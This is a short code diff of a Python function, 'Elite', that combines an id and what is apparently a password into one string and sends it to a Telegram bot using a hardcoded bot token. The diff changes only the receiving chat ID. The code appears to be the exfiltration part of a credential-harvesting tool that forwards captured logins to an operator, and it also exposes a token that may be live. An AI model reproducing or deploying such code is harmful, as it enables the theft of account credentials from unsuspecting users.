@@ -99,7 +99,7 @@ import requests
 def Elite(id,ps):
     try:
         token = "8337751038:AAE0G4MGfO9z56VDawk7VLgEjuMjguKMpdQ"
-        chatid = "5878987183"
+        chatid = "8337751038"
         ok_id =str(id+"|"+ps)
         url = f"https://api.telegram.org/bot{token}/sendMessage"
         qosi = {"chat_id": chatid, "text": ok_id}
